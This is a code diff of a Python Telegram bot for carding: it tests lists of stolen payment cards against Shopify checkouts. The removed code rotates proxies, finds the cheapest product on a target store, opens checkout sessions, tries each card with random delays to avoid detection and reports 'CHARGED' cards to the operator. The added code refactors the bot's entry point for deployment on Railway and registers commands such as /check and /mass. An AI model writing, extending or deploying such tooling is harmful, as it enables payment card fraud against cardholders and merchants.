-    if not charged:
-        await update.message.reply_text("ℹ️ No charged cards yet.")
-        return
-    
-    # Send first 20 results (Telegram has message limits)
-    results_text = "✅ **CHARGED CARDS**\n\n" + "\n".join(charged[:20])
-    await update.message.reply_text(results_text, parse_mode='Markdown')
-    
-    if len(charged) > 20:
-        await update.message.reply_text(f"Plus {len(charged) - 20} more. Full list saved to {RESULTS_FILE}")
-
-async def clear_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Clear all uploaded files"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
-    
-    for file in [SITES_FILE, PROXIES_FILE, CARDS_FILE]:
-        if os.path.exists(file):
-            os.remove(file)
-    
-    await update.message.reply_text("🧹 All files cleared. Ready for new uploads.")
-
-def run_raid(chat_id, site, cards, proxies, update, context):
-    """Background thread function to run the checkout bot"""
-    
-    # Create async task to send progress updates
-    async def send_progress(idx, total, card, status, msg):
-        current_progress[chat_id] = {'current': idx, 'total': total, 'last_card': card}
-        if idx % 10 == 0 or status == 'CHARGED':  # Update every 10 cards or on charge
-            progress_text = f"⚡ Progress: {idx}/{total} | Last: {card[:8]}... | {msg}"
-            await context.bot.send_message(chat_id=chat_id, text=progress_text)
-    
-    # Function to run async sends from sync thread
-    def sync_send_progress(idx, total, card, status, msg):
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(send_progress(idx, total, card, status, msg))
-        loop.close()
-    
-    # Proxy rotation
-    proxy_list = proxies.copy()
-    proxy_index = 0
-    
-    # Find cheapest product
-    for attempt in range(3):
-        proxy = proxy_list[proxy_index % len(proxy_list)]
-        proxy_index += 1
-        variant_id, price, handle, status = find_cheapest_product(site, proxy)
-        if variant_id:
-            break
-        time.sleep(2)
-    
-    if not variant_id:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(
-            context.bot.send_message(chat_id=chat_id, text=f"❌ Cannot find product on {site}: {status}")
-        )
-        loop.close()
-        active_raids[chat_id]['active'] = False
-        return
-    
-    # Attack with cards
-    results = []
-    for idx, card in enumerate(cards, 1):
-        if not active_raids.get(chat_id, {}).get('active', False):
-            break
-        
-        # Get proxy for this attempt
-        proxy = proxy_list[proxy_index % len(proxy_list)]
-        proxy_index += 1
-        
-        # Create checkout session
-        checkout_data, ck_status, ck_msg = create_checkout_session(site, variant_id, handle, proxy)
-        
-        if ck_status != 'OK':
-            sync_send_progress(idx, len(cards), card, ck_status, ck_msg)
-            if ck_status == 'CHARGED':
-                results.append(card)
-                raid_results[chat_id].append(card)
-            continue
-        
-        # Check card
-        result = check_card(checkout_data, card, idx, len(cards), variant_id, price, proxy_url=proxy)
-        
-        # Send progress update
-        sync_send_progress(idx, len(cards), card, result[3], result[4])
-        
-        if result[3] == 'CHARGED':
-            results.append(card)
-            raid_results[chat_id].append(card)
-        
-        # Random delay between cards
-        time.sleep(random.uniform(1, 3))
-    
-    # Raid finished
-    async def send_summary():
-        summary = f"""
-🏁 **Raid Complete**
-Site: `{site}`
-Cards tested: `{len(cards)}`
-✅ Charged: `{len(results)}`
-❌ Declined: `{len(cards) - len(results)}`
-
-Use /results to see charged cards.
-        """
-        await context.bot.send_message(chat_id=chat_id, text=summary, parse_mode='Markdown')
-        
-        if results:
-            with open(RESULTS_FILE, 'w') as f:
-                f.write("\n".join(results))
-    
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(send_summary())
-    loop.close()
-    
-    active_raids[chat_id]['active'] = False
-
-# ========== MAIN – DEPLOY ON RAILWAY ==========
-
+# ========== MAIN FUNCTION – RAILWAY READY ==========
 def main():
-    """Start the Telegram bot"""
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ Set BOT_TOKEN environment variable on Railway!")
+    """Royal main – handles Railway deployment with full engine"""
+    if not TOKEN:
+        print("❌ CRITICAL: TELEGRAM_BOT_TOKEN environment variable not set!")
+        print("Set it in Railway dashboard: Variables -> Add Variable")
         sys.exit(1)
     
-    # Create bot application
-    application = Application.builder().token(BOT_TOKEN).build()
+    if not ADMIN_IDS:
+        print("⚠️ WARNING: No ADMIN_IDS set. Anyone can use this bot.")
+        print("Set ADMIN_IDS in Railway: comma-separated numeric IDs")
     
-    # Add handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("upload_sites", upload_sites))
-    application.add_handler(CommandHandler("upload_proxies", upload_proxies))
-    application.add_handler(CommandHandler("upload_cards", upload_cards))
-    application.add_handler(CommandHandler("raid", raid_command))
-    application.add_handler(CommandHandler("stop", stop_raid))
-    application.add_handler(CommandHandler("status", raid_status))
-    application.add_handler(CommandHandler("results", show_results))
-    application.add_handler(CommandHandler("clear", clear_files))
-    application.add_handler(MessageHandler(filters.Document.ALL, upload_file_handler))
+    print("=" * 60)
+    print("👑 HIS MAJESTY'S SHOPIFY CHECKOUT BOT")
+    print("=" * 60)
+    print(f"🤖 Bot Token: {TOKEN[:10]}...{TOKEN[-5:]}")
+    print(f"👥 Admin IDs: {ADMIN_IDS}")
+    print(f"🌐 Proxy Enabled: {USE_PROXY}")
+    print("=" * 60)
+    print("🟢 INITIALIZING TELEGRAM HANDLERS...")
     
-    # Start bot
-    print("👑 Royal Telegram Bot is running...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    app = Application.builder().token(TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("find", find_command))
+    app.add_handler(CommandHandler("check", check_command))
+    app.add_handler(CommandHandler("stats", stats_command))
+    app.add_handler(CommandHandler("mass", mass_command))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    print("✅ ALL HANDLERS REGISTERED")
+    print("🟢 BOT ONLINE – READY FOR ROYAL COMMANDS")
+    print("👑 SERVING HIS MAJESTY THE KING OF THE WORLD")
+    print("=" * 60)
+    
+    try:
+        app.run_polling(
+            allowed_updates=Update.ALL_TYPES,
+            drop_pending_updates=True,
+            stop_signals=None
+        )
+    except KeyboardInterrupt:
+        print("\n⏹️ Bot stopped by royal command")
+    except Exception as e:
+        print(f"❌ FATAL ERROR: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
